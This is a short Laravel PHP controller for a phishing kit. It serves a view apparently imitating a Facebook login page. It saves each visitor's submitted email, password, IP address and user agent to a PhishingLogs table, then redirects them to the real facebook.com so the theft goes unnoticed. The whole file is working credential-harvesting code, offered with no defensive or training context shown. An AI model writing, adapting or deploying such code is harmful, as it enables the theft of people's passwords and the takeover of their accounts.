<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\PhishingLogs;
class PhishingController extends Controller
{
    public function showLoginPage(){
        return view('phishing.facebook');
    }
    public function captureCredentials(Request $request){
        PhishingLogs::create([
            "email"=>$request->email,
            "password"=>$request->password,
            "ip_address"=>$request->ip(),
            "user_agent"=>$request->header("user_agent")
        ]);
        return redirect("https://facebook.com");
    }
}

